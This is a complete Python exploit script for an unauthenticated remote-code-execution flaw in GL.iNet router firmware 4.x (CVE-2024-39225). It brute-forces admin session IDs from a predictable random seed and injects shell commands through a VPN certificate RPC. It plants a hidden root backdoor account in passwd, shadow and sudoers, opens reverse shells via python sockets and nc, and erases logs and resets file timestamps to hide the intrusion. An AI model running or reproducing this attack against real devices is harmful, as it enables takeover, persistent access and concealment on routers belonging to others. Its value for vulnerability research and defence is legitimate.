#!/usr/bin/env python3
# Exploit Title: GL.iNet Unauthenticated RCE using a SID Bruteforce
# CVE: CVE-2024-39225
# Date: 2024-08-06
# Google Dork: intitle:"GL.iNet Admin Panel"
# Author: Bandar Alharbi (aggressor)
# Vendor: www.gl-inet.com
# Tested Firmware: https://fw.gl-inet.com/firmware/x3000/release/openwrt-x3000-4.0-0406release1-0123-1705996441.bin
# Tested Model: GL-X3000 Spitz AX
# Note: All other models running firmware 4.x.x released before 1 August 2024 are vulnerable as well.
from urllib import parse
from passlib.hash import md5_crypt
from requests.adapters import HTTPAdapter, Retry
from ctypes import *
import ipaddress
import concurrent.futures
import sys
import os
import string
import shutil
import requests
import tarfile
import time
import math
import json
import hashlib
import socket

requests.packages.urllib3.disable_warnings()
h = {'Content-type':'application/json;charset=utf-8', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
s = requests.Session()
s.mount('http://' , HTTPAdapter(max_retries=retry))
s.mount('https://', HTTPAdapter(max_retries=retry))
s.headers = h
s.verify = False
s.keep_alive = True
timeout = 20
max_backward_seconds = 86400 # the maximum bruteforce period is set by default to one day (in seconds). It can be increased to any number for a target that has been running for over a day, but it will take a longer time to finish!!

def cleanUp():
    if new_sid != False:
        clear_traces = ";dmesg -c && /etc/init.d/log restart && echo -n "" >/var/log/nginx/access.log && echo -n "" >/var/log/nginx/error.log && touch -r /sbin/init /etc/shadow /etc/passwd /etc/group /etc/sudoers.d/glsudoers /etc/oui/oui.db /var/log/nginx/error.log /var/log/nginx/access.log;"
        j = {"jsonrpc":"2.0","id":1,"method":"call","params":[new_sid,"ovpn-server","generate_certificate",{"ca":clear_traces}]}
        print("[*] Clearing traces ...")
        r = s.post(url, json=j, timeout=timeout)
    print("[*] Removing temporary files ...")
    if os.path.exists("SIDs"):
        os.remove("SIDs")
    if os.path.exists("logread"):
        shutil.rmtree("logread")
    sys.exit(0)

def rce():
    # RCE exists in /usr/lib/oui-httpd/rpc/ovpn-server.so - this is another authenticated RCE vuln I discovered to get RCE ;)
    rev_shell1 = ";python -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/ash')\";" %(ip,port)
    rev_shell2 = ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f;" %(ip,port)
    j1 = {"jsonrpc":"2.0","id":1,"method":"call","params":[new_sid,"ovpn-server","generate_certificate",{"ca":rev_shell1}]}
    j2 = {"jsonrpc":"2.0","id":1,"method":"call","params":[new_sid,"ovpn-server","generate_certificate",{"ca":rev_shell2}]}
    try:
        print("\t[*] Check your listener!")
        print("[!] Did NOT receive a connection back? make sure your firewall is NOT blocking incoming connections. You may also try again using the one-linear command (shown below) and other known ports like 123,51820,20,21 22,53,443,80 ... etc")
        s.post(url, json=j1, timeout=0.9) # fire and hope!
        s.post(url, json=j2, timeout=0.9) # fire and hope!
    except requests.exceptions.ReadTimeout:
        pass

def backdooring():
    global password
    j = {"jsonrpc":"2.0","id":1,"method":"call","params":[admin_sid,"acl","add_user",{"group":"root","username":"glservices"}]}
    r = s.post(url, json=j, timeout=timeout)
    if r.status_code == 200 and "Access denied" not in r.text:
        print("[*] The username \033[1mglservices\033[0m has been added to the Root ACL group of GL's Admin Panel!")
        time.sleep(1)
        add_user = ";grep glservices /etc/passwd>&2||echo 'glservices:x:820:820:glservices:/etc:/bin/ash'>>/etc/passwd&&grep glservices /etc/shadow>&2||echo 'glservices:$1$5L2pZM0f$1zqkitlrLj2P4SzkAmPQv1:19752:0:99999:7:::'>>/etc/shadow&&grep glservices /etc/group>&2||echo 'glservices:x:820:glservices'>>/etc/group&&echo '%glservices ALL=(ALL) ALL'>>/etc/sudoers.d/glsudoers;" # hardcoded backdoor account gets inserted into the sahdow & passwd files, which does not appear in the logs!
        j = {"jsonrpc":"2.0","id":1,"method":"call","params":[admin_sid,"ovpn-server","generate_certificate",{"ca":add_user}]}
        r = s.post(url, json=j, timeout=timeout)
        if r.status_code == 200 and "Access denied" not in r.text:
            print("[*] A Linux backdoor account has been created and added to the sudoers group!")
            j = {"jsonrpc":"2.0","id":1,"method":"challenge","params":{"username":"glservices"}}
            r = s.post(url, json=j, timeout=timeout)
            if r.status_code == 200 and "Access denied" not in r.text and r.json()['result']['nonce']:
                nonce = r.json()['result']['nonce']
                salt  = r.json()['result']['salt']
                password = md5_crypt.using(salt=salt).hash("glservices")
                data = f'glservices:{password}:{nonce}'
                hash = hashlib.md5(data.encode()).hexdigest()
                j = {"jsonrpc":"2.0","id":1,"method":"login","params":{"username":"glservices","hash":hash}}
                r = s.post(url, json=j, timeout=timeout)
                nsid = r.json()['result']['sid']
                print("[*] A new root SID created for the \033[1mglservices\033[0m backdoor account: \033[1m%s\033[0m" %nsid)
                print("[*] Login in into GL admin panel as root by setting the cookie \033[1mAdmin-Token\033[0m to ANY of the valid detected SIDs!")
                print("[*] Note! the newly created SID is preferable and more stealthy - unused SIDs will \033[1mexpire\033[0m after 300 seconds!")
                return nsid
            else:
                print("[*] However, we could NOT login into GL Admin Panel using the backdoor account \033[1mglservices\033[0m ... try again later!")
        else:
            print("[*] We could NOT create a Linux backdoor account ... try again later!")
    else:
        print("[*] Could NOT backdoor the target!\n[*] Either the admin may have logged out while executing the attack, or the device has become unreachable!")
    return False

def backdoorInfo():
    info = '''\033[1m[!] IMPORTANT RECOMPROMISE INFO:\033[0m
 - You can ssh into the target using the backdoor account (\033[1mglservices:glservices\033[0m) then elevate its privileges to root using \033[1msudo -i\033[0m.
 - If the detected SIDs have expired, or you have logged out, you do NOT need re-execute the exploit! Just invoke the following one linear (\033[1min bold\033[0m) to get a new valid SID for the backdoor account:
   \033[1mh=$(echo -n glservices:'%s':$(curl -s -k  -H 'Content-Type: application/json;charset=utf-8' -d '{"jsonrpc": "2.0", "id": 1, "method": "challenge", "params": {"username": "glservices"}}' '%s'|cut -d '"' -f18) |md5sum|cut -d' ' -f1) && curl -s -k  -H 'Content-Type: application/json;charset=utf-8' -d '{"jsonrpc": "2.0", "id": 1, "method": "login", "params": {"username": "glservices", "hash":"'$h'"}}' '%s'\033[0m

 - Now you can use this new generated SID to either login into GL Admin Panel (by setting the value for the `Admin-Token` cookie) or to get a reverse shell!
 - To get a shell, insert valid SID in the following one linear (\033[1min bold\033[0m) along with your listening IP and PORT:
   \033[1mcurl -s -k -H 'Content-Type: application/json;charset=utf-8' -d '{"jsonrpc": "2.0", "id": 1, "method": "call", "params": ["%s", "ovpn-server", "generate_certificate", {"ca": ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.8.55 443 >/tmp/f;"}]}' '%s'\033[0m
    '''%(password,url,url,new_sid,url)
    print(info)

def makeRequest(sid):
    j = {"jsonrpc":"2.0","id":1,"method":"alive","params":{"sid":sid}}
    r = s.post(url, json=j, timeout=timeout)
    if "Access denied" not in (r.text):
        print("[*] An admin SID found: \033[1m%s\033[0m" %sid)
        return sid

def bruteForce():
    counter = 1
    e = concurrent.futures.ProcessPoolExecutor(max_workers=8)
    with open("SIDs", "r", encoding="utf-8") as f:
        sids = f.read().splitlines()
    print("[*] Bruteforce attack has started ... it may take very long time ...")
    for sid in range(0, len(sids), 2048):
        print("[*] The number of SIDs have been bruteforced so far: \033[1m%d\033[0m" %(2048*counter), end="\r")
        counter += 1
        results = e.map(makeRequest, sids[sid:sid+2048])
        for response in list(results):
            if response:
                e.shutdown(wait=True, cancel_futures=True)
                return response

def generateSIDs(boot_time):
    myrand = "./myrand.so"
    call = CDLL(myrand)
    with open("SIDs", "a") as SIDs:
        for i in range(800):         # number of SIDs to generate *WITHOUT* a dynamic seed - known as CVE-2023-50920
            sid = ""
            for x in range(32):      # each SID consists of 32 chars
                sid += string.printable[call.main()-1]
            SIDs.write(sid+"\n")
        print("[*] Generating a huge list of SIDs ... please be patient ...")
        for s in range(max_backward_seconds):
            call.mysrand(boot_time)  # setting the seed in srand()
            for i in range(200):     # number of SIDs (200) to generate passing the boot time value as a seed
                sid = ""
                for x in range(32):
                    sid += string.printable[call.main()-1]
                SIDs.write(sid+"\n")
            boot_time -= 1           # decreasing the seconds by 1 till we hit the exact boot time used for seeding srand() on the target
    print("[*] The bruteforce list has been constructed!")

def parseBootTime():
    tar = tarfile.open("logread.tar")
    tar.extract("logread/system.log", filter="data")
    bt = open("logread/system.log").readline()
    bt = ' '.join(bt.split())        # removing double spaces in the date string - this usually needed when the time zone is NOT set on the target
    bt = t = ' '.join(bt.split(' ')[0:5])
    try:
        bt = time.strptime(bt)
        bt = math.trunc(time.mktime(bt))
        if bt > 60:
            print("[*] Boot Time:", t)
            return bt
        else:
            print("[*] We could NOT find a valid boot time from the downloaded logs! But, there is still a hope! Hang on ...")
            return int(time.time())
    except:
        return int(time.time())

def isGlobalIP():
    hostname = parse.urlsplit(url)
    ip = socket.gethostbyname(hostname.netloc)
    isGlobal = ipaddress.ip_address(ip).is_global
    if isGlobal == True:
        print("[*] The target system has a Public IP!")
        r = s.get("https://worldtimeapi.org/api/ip/%s" %ip, timeout=timeout)
        print("[*] Getting the local time from the IP's Geolocation: \033[1m%s\033[0m" %r.json()['timezone'])
        bt = r.json()['unixtime']
        print("[*] Current date/time of the target system: \033[1m%s\033[0m" %(r.json()['datetime'].rsplit('.')[0]).split('T'))
        return bt
    else:
        print("[*] The target system has a Private IP!")
        return int(time.time())

def logsExist(): # This is my CVE-2024-27356, which can be used to speed up the bruteforce attack.
    r = s.get(url+"/js/logread.tar", timeout=timeout)
    if r.status_code == 200:
        f = open("logread.tar", "wb")
        f.write(r.content)
        f.close()
        print("[*] Full logs archive \033[1mlogread.tar\033[0m has been downloaded without authentication!")
        print("[*] Later on, you can manually inspect the archive as it sometimes exposes juicy sensitive information!")
        return True
    else:
        print("[*] The \033[1mlogread.tar\033[0m archive does NOT exist.")
        return False

def isVulnerable():
    r1 = requests.post(url+"/rpc", verify=False, timeout=timeout, headers=h)
    if r1.status_code == 500 and "nginx" in r1.text:
        r2 = requests.get(url+"/views/gl-sdk4-ui-login.common.js", verify=False, timeout=timeout, headers=h)
        if  "Admin-Token" in r2.text:
            j  = {"jsonrpc":"2.0","id":1,"method":"call","params":["","ui","check_initialized"]}
            r3 = requests.post(url+"/rpc", verify=False, json=j, timeout=timeout, headers=h)
            ver = r3.json()['result']['firmware_version']
            model = r3.json()['result']['model']
            if ver.startswith(('4.')):
                print("[*] Firmware's version (\033[1m%s\033[0m) is vulnerable!" %ver)
                print("[*] Device model is: \033[1m%s\033[0m" %model)
                return True
    print("[*] Either the firmware version is NOT vulnerable or the target may NOT be a GL.iNet device!")
    return False

def isAlive():
    try:
        r = requests.get(url, verify=False, timeout=timeout, headers=h)
        if r.status_code != 200:
            print("[*] Make sure the target's web interface (Admin Panel) is accessible!")
            return False
        elif r.status_code == 200:
            print("[*] The target is reachable!")
            return True
    except Exception:
        print("[*] Error occurred when connecting to the target!")
        pass
    return False


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("exploit.py url")
        sys.exit(0)
    url = sys.argv[1]
    url = url.lower()
    if not url.startswith(('http://', 'https://')):
        print("[*] An invalid url format! It should be http[s]://ae3f8b8.glddns.com  OR  http[s]://192.168.8.1")
        sys.exit(0)
    if url.endswith("/"):
        url = url.rstrip("/")
    if not os.path.isfile("./myrand.so"):
        print("Exited! Make sure to compile and place the file \033[1mmyrand.so\033[0m in the exploit's directory!")
        sys.exit(0)
    print("\033[1m********** GL.iNet Unauthenticated RCE using SID Bruteforce **********\033[0m")

    new_sid = False
    try:
        if (isAlive() and isVulnerable()) == (True and True):
            if logsExist() == True:
                boot_time = parseBootTime()
            else:
                boot_time = isGlobalIP()

            url = url + "/rpc"
            generateSIDs(boot_time)
            admin_sid = bruteForce()
            if admin_sid:
                new_sid = backdooring()
                if new_sid != False:
                    while True:
                        print("[*] Would you like to get a root-privileged reverse shell as well? \033[1m(Y/N)\033[0m", end =" ")
                        ans = input().lower()
                        if ans == "y":
                            print("[*] Run a Netcat listener, then enter your IP and PORT:")
                            ip   = input("\t[*] IP: ")
                            port = input("\t[*] PORT: ")
                            rce()
                            break
                        elif ans == "n":
                            break
                    backdoorInfo()
            else:
                print("[*] We could NOT find a valid admin SID!")
                print("[*] Reasons: an admin is NOT currently logged in and/or the system's time is NOT correctly set and/or it has been running for longer than the chosen value of the max_backward_seconds!")
                print("[*] Try again on weekends as most admins tinker around with their systems at such times!")
                print("[*] Alternatively, you can increase the max number of seconds (max_backward_seconds) to go beyond ONE dat, and rerun the exploit!")
        cleanUp()
    except KeyboardInterrupt:
        print("\n[*] Stopped by the user.")
        cleanUp()
